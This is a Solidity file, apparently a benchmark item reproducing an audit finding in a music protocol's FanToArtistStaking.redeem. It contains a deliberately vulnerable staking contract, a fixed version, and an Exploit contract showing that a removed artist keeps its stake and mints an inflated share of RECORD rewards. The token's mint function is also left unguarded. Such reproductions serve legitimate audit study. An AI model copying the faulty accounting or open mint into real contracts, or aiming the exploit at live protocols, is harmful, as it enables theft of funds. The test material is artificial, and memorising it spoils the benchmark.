// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.27;

/*
 * AuditVault 59402 — Music Protocol FanToArtistStaking.redeem (Quantstamp).
 * redeem() only calls _calcSinceLastPosition when the artist is still verified.
 * After removeArtist, a full redeem leaves artistStake unchanged, so getReward
 * mints RECORD against the pre-removal stake. A removed artist with 1,000 stake
 * takes 1,000 of a 2,000 RECORD pot that should have gone entirely to the
 * still-verified artist.
 */

contract RECORD {
    string public name = "RECORD";
    string public symbol = "RECORD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

contract FanToArtistStaking {
    struct Stake {
        uint256 amount;
    }

    RECORD public record;
    uint256 public rewardPot = 2_000 ether;
    address public removedArtist;
    address public activeArtist;

    mapping(address => bool) public _verifiedArtists;
    mapping(address => mapping(address => Stake)) public _stake;
    mapping(address => uint256) public artistStake;
    mapping(address => bool) public claimed;
    uint256 public skippedRedeem;

    constructor(RECORD _record, address _removed, address _active) {
        record = _record;
        removedArtist = _removed;
        activeArtist = _active;
        _verifiedArtists[_removed] = true;
        _verifiedArtists[_active] = true;
    }

    function stakeFor(address artist, address user, uint256 amount) external {
        require(_verifiedArtists[artist], "verified");
        _stake[artist][user].amount += amount;
        artistStake[artist] += amount;
    }

    function removeArtist(address artist) external {
        _verifiedArtists[artist] = false;
    }

    function _calcSinceLastPosition(address artist, uint256 amount, bool add) internal {
        if (add) artistStake[artist] += amount;
        else artistStake[artist] -= amount;
    }

    function redeem(address artist, address user) external {
        bool live = _verifiedArtists[artist];
        // verified artists are discounted; removed artists are not
        if (live) {
            _calcSinceLastPosition(artist, _stake[artist][user].amount, false);
        }
        if (!live) skippedRedeem += _stake[artist][user].amount; // @> VULN:
        _stake[artist][user].amount = 0;
    }

    function getReward(address artist) external {
        require(!claimed[artist], "claimed");
        claimed[artist] = true;
        uint256 total = artistStake[removedArtist] + artistStake[activeArtist];
        require(total > 0, "stake");
        uint256 payout = rewardPot * artistStake[artist] / total;
        if (payout > 0) record.mint(artist, payout);
    }
}

contract FanToArtistStakingFixed {
    RECORD public record;
    uint256 public rewardPot = 2_000 ether;
    address public removedArtist;
    address public activeArtist;
    mapping(address => bool) public verified;
    mapping(address => mapping(address => uint256)) public stakeOf;
    mapping(address => uint256) public artistStake;
    mapping(address => bool) public claimed;

    constructor(RECORD _record, address _removed, address _active) {
        record = _record;
        removedArtist = _removed;
        activeArtist = _active;
        verified[_removed] = true;
        verified[_active] = true;
    }

    function stakeFor(address artist, address user, uint256 amount) external {
        stakeOf[artist][user] += amount;
        artistStake[artist] += amount;
    }

    function removeArtist(address artist) external {
        verified[artist] = false;
    }

    function redeem(address artist, address user) external {
        uint256 amt = stakeOf[artist][user];
        artistStake[artist] -= amt;
        stakeOf[artist][user] = 0;
    }

    function getReward(address artist) external {
        require(!claimed[artist], "claimed");
        claimed[artist] = true;
        uint256 total = artistStake[removedArtist] + artistStake[activeArtist];
        uint256 payout = total == 0 ? 0 : rewardPot * artistStake[artist] / total;
        if (payout > 0) record.mint(artist, payout);
    }
}

contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant REMOVED = 0x2222222222222222222222222222222222222222;
    address internal constant ACTIVE = 0x3333333333333333333333333333333333333333;
    uint256 internal constant STAKE = 1_000 ether;

    RECORD public record;
    FanToArtistStaking public staking;
    uint256 public removedMinted;

    function run() external {
        record = new RECORD();
        staking = new FanToArtistStaking(record, REMOVED, ACTIVE);
        staking.stakeFor(REMOVED, ATTACKER, STAKE);
        staking.stakeFor(ACTIVE, ATTACKER, STAKE);
        staking.removeArtist(REMOVED);
        staking.redeem(REMOVED, ATTACKER);

        require(staking.artistStake(REMOVED) == STAKE, "not discounted");
        require(staking._verifiedArtists(REMOVED) == false, "still verified");

        staking.getReward(REMOVED);
        removedMinted = record.balanceOf(REMOVED);
        require(removedMinted == 1_000 ether, "inflated");
    }
}
